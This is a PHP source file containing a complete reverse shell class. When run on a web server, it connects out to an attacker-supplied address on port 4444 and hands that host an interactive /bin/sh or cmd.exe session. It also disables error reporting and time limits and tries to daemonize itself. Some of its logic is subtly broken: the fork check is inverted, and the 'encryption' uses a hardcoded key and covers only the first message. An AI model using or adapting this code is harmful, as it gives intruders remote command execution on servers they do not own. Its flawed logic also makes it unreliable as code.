<?php
// Advanced PHP Reverse Shell Class
// Updated version based on Ivan Šincek's code
// Requires PHP 7.0 or higher for more robust error handling and encryption

class AdvancedShell {
    private $addr;
    private $port;
    private $os;
    private $shell;
    private $descriptorspec;
    private $buffer;
    private $clen;
    private $error;
    private $sdump;
    private $secure;
    private $logPath;

    public function __construct($addr, $port, $secure = false, $logPath = null) {
        $this->addr = $addr;
        $this->port = $port;
        $this->buffer = 1024;
        $this->clen = 0;
        $this->error = false;
        $this->sdump = true;
        $this->secure = $secure; // Enable encryption
        $this->logPath = $logPath;
        $this->descriptorspec = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
    }

    private function detectOS() {
        $os = PHP_OS;
        if (stripos($os, 'LINUX') !== false || stripos($os, 'DARWIN') !== false) {
            $this->os = 'LINUX';
            $this->shell = '/bin/sh';
        } elseif (stripos($os, 'WIN') !== false) {
            $this->os = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $this->log("OS_ERROR: Unsupported OS: $os");
            return false;
        }
        return true;
    }

    private function daemonizeProcess() {
        if (!function_exists('pcntl_fork')) return false;

        $pid = @pcntl_fork();
        if ($pid < 0) {
            $this->log("DAEMONIZE_ERROR: Fork failed");
            return false;
        }
        if ($pid > 0) {
            exit(0); // Exit parent process
        }
        posix_setsid();
        return true;
    }

    private function applySettings() {
        @error_reporting(0);
        @set_time_limit(0);
        @umask(0);
    }

    private function encryptData($data) {
        if ($this->secure) {
            return openssl_encrypt($data, 'AES-128-CTR', 'securekey', 0, '1234567891011121');
        }
        return $data;
    }

    private function decryptData($data) {
        if ($this->secure) {
            return openssl_decrypt($data, 'AES-128-CTR', 'securekey', 0, '1234567891011121');
        }
        return $data;
    }

    private function log($message) {
        if ($this->logPath) {
            file_put_contents($this->logPath, date('[Y-m-d H:i:s] ') . $message . PHP_EOL, FILE_APPEND);
        }
    }

    private function streamRW($input, $output, $iname, $oname) {
        while (($data = fread($input, $this->buffer)) && fwrite($output, $data)) {
            $this->dump($data);
        }
    }

    private function dump($data) {
        if ($this->sdump) {
            $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
            echo $data;
        }
    }

    public function run() {
        if ($this->detectOS() && $this->daemonizeProcess() === false) {
            $this->applySettings();

            $socket = @fsockopen($this->addr, $this->port);
            if (!$socket) {
                $this->log("SOCKET_ERROR: Cannot connect to {$this->addr}:{$this->port}");
                return;
            }
            stream_set_blocking($socket, false);

            $process = @proc_open($this->shell, $this->descriptorspec, $pipes);
            if (!$process) {
                $this->log("PROC_ERROR: Failed to start shell");
                fclose($socket);
                return;
            }

            foreach ($pipes as $pipe) {
                stream_set_blocking($pipe, false);
            }

            $status = proc_get_status($process);
            fwrite($socket, $this->encryptData("SOCKET: Shell connected! PID: {$status['pid']}\n"));

            while (!$this->error) {
                $status = proc_get_status($process);
                if (feof($socket) || feof($pipes[1]) || !$status['running']) break;

                $streams = ['read' => [$socket, $pipes[1], $pipes[2]], 'write' => null, 'except' => null];
                $changedStreams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0);
                if ($changedStreams === false) break;

                if (in_array($socket, $streams['read'])) $this->streamRW($socket, $pipes[0], 'SOCKET', 'STDIN');
                if (in_array($pipes[1], $streams['read'])) $this->streamRW($pipes[1], $socket, 'STDOUT', 'SOCKET');
                if (in_array($pipes[2], $streams['read'])) $this->streamRW($pipes[2], $socket, 'STDERR', 'SOCKET');
            }

            foreach ($pipes as $pipe) fclose($pipe);
            proc_close($process);
            fclose($socket);
        }
    }
}

echo '<pre>';
$sh = new AdvancedShell('YOURIPHERE', 4444, true, '/path/to/logfile.log');
$sh->run();
unset($sh);
echo '</pre>';
?>
